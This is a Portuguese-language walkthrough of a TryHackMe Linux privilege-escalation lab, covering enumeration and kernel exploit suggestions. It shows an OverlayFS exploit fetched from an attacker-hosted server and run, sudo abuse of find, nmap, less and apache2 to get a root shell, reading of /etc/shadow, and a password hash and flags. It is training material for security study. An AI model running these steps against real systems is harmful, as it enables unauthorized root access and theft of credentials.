<!-- ================================================= -->
<!--     Linux Privilege Escalation — TryHackMe Lab    -->
<!-- ================================================= -->

<p align="center">
  <img src="https://img.shields.io/badge/Status-Developed-success?style=for-the-badge">
  <img src="https://img.shields.io/badge/Topic-Linux%20Privilege%20Escalation-critical?style=for-the-badge">
</p>

<p align="center">
  <img src="https://img.shields.io/badge/Post--Exploitation-Offensive-red?style=flat-square">
  <img src="https://img.shields.io/badge/Linux-Kernel-black?style=flat-square&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Vulnerabilities-CVE-blue?style=flat-square">
  <img src="https://img.shields.io/badge/Hardening-Defensive-informational?style=flat-square">
</p>

---

# 🐧 Linux Privilege Escalation — Laboratório Prático (TryHackMe)

> Documentação técnica do laboratório **Linux Privilege Escalation** do TryHackMe, com foco em **pós-exploração**, **enumeração manual e automatizada**, **análise de vulnerabilidades de kernel** e **exploração prática de CVEs reais** para obtenção de privilégios **root** em ambientes Linux.

---

### 📌 Metadados

- **Plataforma:** TryHackMe  
- **Laboratório:** Linux Privilege Escalation  
- **Status:** `#developed`  
- **Categoria:** Post-Exploitation · Privilege Escalation  
- **Ambiente:** Linux (Ubuntu)

---

### 🏷️ Tags

`#LinuxPrivEsc` `#PostExploitation` `#KernelExploitation`  
`#CVE` `#DirtyCOW` `#OverlayFS` `#PwnKit`  
`#Pentest` `#CyberSecurity` `#TryHackMe`

---
# Laboratório Prático : [Linux Privilege Escalation](https://tryhackme.com/room/linprivesc)

## 1. Enumeração

A enumeração é o primeiro passo a ser dado após obter acesso a qualquer sistema. Você pode ter acessado o sistema explorando uma vulnerabilidade crítica que resultou em acesso de nível root ou simplesmente encontrado uma maneira de enviar comandos usando uma conta com privilégios baixos. Os testes de penetração, ao contrário das máquinas CTF, não terminam quando você obtém acesso a um sistema específico ou a um nível de privilégio de usuário. Como você verá, a enumeração é tão importante durante a fase pós-comprometimento quanto antes.

### `hostname`

O comando `hostname` retornará o nome do host da máquina alvo. Embora esse valor possa ser facilmente alterado ou conter uma string relativamente sem significado (por exemplo, Ubuntu-3487340239), em alguns casos, ele pode fornecer informações sobre a função do sistema alvo na rede corporativa (por exemplo, SQL-PROD-01 para um servidor SQL de produção).

```bash
hostname
```

**Saída:**

```text
wade7363
```

### `uname -a`

Irá imprimir informações do sistema, fornecendo detalhes adicionais sobre o kernel usado pelo sistema. Isso será útil ao procurar por possíveis vulnerabilidades no kernel que possam levar à escalada de privilégios.

```bash
uname -a
```

**Saída:**

```text
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86 64 x68_64 GNU/Linux
```

### `/etc/os-release`

Para fazer uma verificação da versão do sistema operacional utilizamos o comando `cat /etc/os-release`.

```bash
cat /etc/os-release
```

**Saída:**

```text
NAME="Ubuntu"
VERSION="14.04, Trusty Tahr"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 14.04 LTS"
VERSION_ID="14.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu"
```

---
## 2. Exploração de Vulnerabilidades de Kernel

### Identificação de Vulnerabilidades com LinPEAS

O LinPEAS (Linux Privilege Escalation Awesome Script) é uma ferramenta de enumeração automatizada que utiliza o Linux Exploit Suggester para identificar vulnerabilidades de kernel conhecidas que podem ser exploradas para escalação de privilégios.

### Resultados do Linux Exploit Suggester

```text
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                  
[+] [CVE-2016-5195] dirtycow                                                                                        

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2015-1328] overlayfs

   Details: http://seclists.org/oss-sec/2015/q2/717
   Exposure: highly probable
   Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
   Download URL: https://www.exploit-db.com/download/37292

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
```

### Análise das Vulnerabilidades Identificadas

#### 1. **CVE-2016-5195 - Dirty COW**

**Mecanismo:** Race condition no mecanismo de copy-on-write do kernel Linux  
**Impacto:** Permite que usuários não privilegiados ganhem acesso de escrita à memória somente leitura  
**Sistemas Afetados:** Kernel Linux versões desde 2007 até 2016

#### 2. **CVE-2015-1328 - OverlayFS**

**Mecanismo:** Vulnerabilidade no filesystem OverlayFS que permite bypass de permissões  
**Impacto:** Permite escalação de privilégios para root  
**Sistemas Afetados:** Ubuntu 12.04-15.04 com kernels específicos

#### 3. **CVE-2021-4034 - PwnKit**

**Mecanismo:** Buffer overflow em pkexec (Polkit) quando argc=0  
**Impacto:** Escalação local de privilégios para root  
**Sistemas Afetados:** Sistemas com polkit <= 0.120

---
## 3. Exploração do CVE-2015-1328 (OverlayFS)

### O que é OverlayFS?

**OverlayFS** é um sistema de arquivos de união que permite sobrepor um sistema de arquivos em outro. É comumente usado em containers Docker para criar camadas de imagens. A vulnerabilidade ocorre devido a uma falha na implementação que permite a usuários não privilegiados criar arquivos com permissões root no sistema host.

### Passo a Passo da Exploração

#### 1. Preparação do Exploit

**Na máquina atacante:**


```bash
# Download do exploit da Exploit Database
wget "https://www.exploit-db.com/download/37292"

# Renomear o arquivo
mv 37292 ofs.c
```

**Conversão do arquivo:**  
O arquivo baixado da Exploit Database vem em formato `37292` que é basicamente um arquivo C com um nome numérico. Renomeamos para `ofs.c` para facilitar a compilação.

#### 2. Transferência para o Alvo

**Na máquina atacante (servidor web):**

Primeiro é preciso transformar o arquivo em arquivo `.c` com nome `ofs.c` (explicar como)

Em seguida usando um servidor python na maquina atacante:

```bash
# Iniciar servidor web
sudo python3 -m http.server 80
```

**Na máquina alvo:**

```bash
# Navegar para diretório temporário
cd /tmp

# Baixar o exploit
wget "http://{IP_ATACANTE}:80/ofs.c"
```

#### 3. Compilação e Execução

```bash
# Compilar o exploit
gcc ofs.c -o ofs

# Dar permissão de execução
chmod +x ofs

# Executar o exploit
./ofs
```

### Saída da Execução e Análise

**Saída esperada:**

```text
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
```

**Explicação detalhada do que acontece:**

1. **spawning threads**: O exploit inicia múltiplas threads para criar condições de race condition
2. **mount #1 / mount #2**: Cria montagens OverlayFS manipuladas para explorar a vulnerabilidade
3. **/etc/ld.so.preload created**: Cria arquivo ld.so.preload que força o carregamento de bibliotecas específicas
4. **creating shared library**: Cria biblioteca compartilhada maliciosa que será carregada por processos
5. **Obtenção de shell root**: O exploit modifica permissões para obter shell com UID 0 (root)

### Mecanismo Técnico da Exploração

**Vulnerabilidade específica:**

```c
// O exploit abusa da função ovl_copy_up() no OverlayFS
// que não valida adequadamente credenciais ao copiar arquivos
// Permitindo que usuários não-root criem arquivos com permissões root
```

**Fluxo da exploração:**

1. Cria diretórios temporários para montagem OverlayFS
2. Configura montagens manipuladas
3. Cria arquivo `/etc/ld.so.preload` apontando para biblioteca maliciosa
4. A biblioteca maliciosa redefine funções como `getuid()` para retornar 0
5. Processos subsequentes acreditam que estão rodando como root

### Verificação de Acesso Root

```bash
# Verificar privilégios
whoami
# Deve retornar: root

id
# uid=0(root) gid=0(root) groups=0(root)

# Verificar contexto de segurança
cat /proc/self/status | grep -E "(Uid|Gid)"
# Mostra UID e GID como 0
```

### Acesso aos Arquivos Protegidos

**Localização da flag do usuário matt:**

```bash
# Navegar para diretório do usuário matt
cd /home/matt

# Verificar conteúdo
ls -la
# -rw-r----- 1 matt matt 20 Jan 15 10:30 flag1.txt

# Ler a flag
cat flag1.txt
```

**Resultado:**

```text
THM-28392872729920
```

**Análise de permissões pré-exploração:**

- Antes: `-rw-r-----` (apenas matt e grupo matt podem ler)
- Depois: Acesso root permite ler qualquer arquivo do sistema

---
## 4. Sudo e Escalonamento de Privilégios

### Visão Geral do Mecanismo Sudo

O comando `sudo` permite executar programas com privilégios de superusuário (root). Administradores podem configurá-lo para conceder acesso granular a usuários específicos, permitindo que executem comandos privilegiados sem conceder acesso root completo. Por exemplo, um analista de segurança pode receber permissão para executar apenas o Nmap com privilégios elevados.

**Arquitetura do Sudo:**

```text
Usuário → sudo → Política (/etc/sudoers) → Execução como root
```

### Verificação de Privilégios Sudo

Qualquer usuário pode verificar seus privilégios sudo com os seguintes comandos:

```bash
# Verificar comandos permitidos com sudo
sudo -l

# Verificar sudoers detalhado
sudo -ll

# Verificar comandos permitidos para o usuário atual
sudo -U $(whoami) -l

# Verificar histórico de comandos sudo
sudo cat /var/log/auth.log | grep sudo
```

### Exploração Direta de Binários Sudo

#### Utilizando GTFOBins

O repositório [GTFOBins](https://gtfobins.github.io/) documenta como binários comuns podem ser explorados para escapar de ambientes restritos ou elevar privilégios. Quando um usuário tem permissão sudo para executar determinado binário, pode-se consultar o GTFOBins para verificar se existem métodos conhecidos para obter shell root através dele.

#### Exploração de Funções de Aplicativos

Alguns aplicativos, mesmo sem vulnerabilidades conhecidas, podem ter funcionalidades que permitem vazamento de informações ou execução de código. Por exemplo, o Apache2 possui a opção `-f` para especificar um arquivo de configuração alternativo:

```bash
sudo apache2 -f /etc/shadow
```

Quando um arquivo inválido é fornecido, o Apache2 exibe uma mensagem de erro que inclui parte do conteúdo do arquivo, possibilitando a leitura de arquivos sensíveis como `/etc/shadow`.

#### Exploração via LD_PRELOAD

A variável de ambiente `LD_PRELOAD` permite carregar bibliotecas compartilhadas antes das bibliotecas padrão. Se o sudo estiver configurado com `env_keep` incluindo `LD_PRELOAD`, é possível injetar código malicioso.

**Identificação da Vulnerabilidade:**

![](https://assets.tryhackme.com/additional/imgur/gGstS69.png)


### Caso Prático

#### Enumeração de Privilégios

```bash
sudo -l
```

**Saída:**

```text
Matching Defaults entries for karen on ip-10-65-143-118:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-65-143-118:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

O usuário Karen pode executar três programas com sudo sem necessidade de senha (`NOPASSWD`).

#### Exploração com Find

Consultando o [GTFOBins para find](https://gtfobins.github.io/gtfobins/find/), encontramos que o comando `find` pode executar comandos arbitrários através da flag `-exec`:

```bash
# Shell interativo
sudo find /home -exec /bin/bash \;

# Shell one-liner
sudo find . -exec /bin/sh \; -quit
```

**Funcionamento:**

- `find .`: Procura no diretório atual
- `-exec /bin/sh \;`: Para cada arquivo encontrado, executa `/bin/sh`
- `-quit`: Encerra após o primeiro resultado    

Isso spawna um shell root, permitindo acesso ao sistema com privilégios elevados.

#### Captura da Flag 2

```bash
cd /home/ubuntu
cat flag2.txt
```

**Saída:**

```text
THM-402028394
```

Outro exemplo possível usando nmap:

```bash
sudo nmap --interactive
!/bin/sh
```

### Leitura do Arquivo `/etc/shadow`

Outro programa vulnerável listado no `sudo -l` é o `less`. Através dele é possível  ler o arquivo `/etc/shadow` que contém hashes das senhas dos usuários

```bash
sudo less /etc/shadow
```

Resposta:

```text
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

### Análise do Hash

- `$6`: Indica algoritmo SHA-512
- `2.sUUDsOLIpXKxcr`: Salt (12 caracteres)
- Hash restante: Hash criptográfico da senha

### Resumo do Vetor de Ataque

1. Enumeração: sudo -l revela programas executáveis com privilégios
2. Pesquisa: Consulta ao GTFOBins para métodos de exploração
3. Execução: Uso dos parâmetros adequados para spawnar shell root
4. Coleta: Acesso a arquivos sensíveis e flags